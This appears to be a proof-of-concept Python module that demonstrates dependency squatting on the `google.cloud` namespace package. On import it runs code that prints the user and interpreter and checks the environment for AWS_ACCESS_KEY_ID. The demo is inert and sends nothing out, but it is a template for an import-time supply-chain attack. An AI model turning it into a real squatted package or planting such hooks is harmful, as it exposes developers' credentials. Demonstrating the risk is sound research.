"""
Poisoned sub-namespace: `google.cloud`.

PEP 420 implicit namespace packages have no __init__.py at the
namespace root (`google/` here), so there is no file the attacker
can run on `import google` itself. The realistic modern attack
is therefore to squat a well-known SUB-namespace that victims
already import — `google.cloud` is the Google Cloud SDK's shared
sub-namespace, used by google-cloud-storage, google-cloud-bigquery,
google-cloud-pubsub, and dozens of others.

Any `import google.cloud.<x>` import must first import `google.cloud`, 
which runs this file.
"""

import os
import sys


# Payload execution on sub-namespace import.
print("[*] Malicious google.cloud namespace package initialized")
print(f"[*] Code executing in: {__file__}")
print(f"[*] Current user: {os.getenv('USER', 'unknown')}")
print(f"[*] Python interpreter: {sys.executable}")

aws_key = os.getenv("AWS_ACCESS_KEY_ID")
if aws_key:
    print("[!] Found AWS credentials in environment")

print("[*] This code runs every time google.cloud (or any of its submodules) is imported")
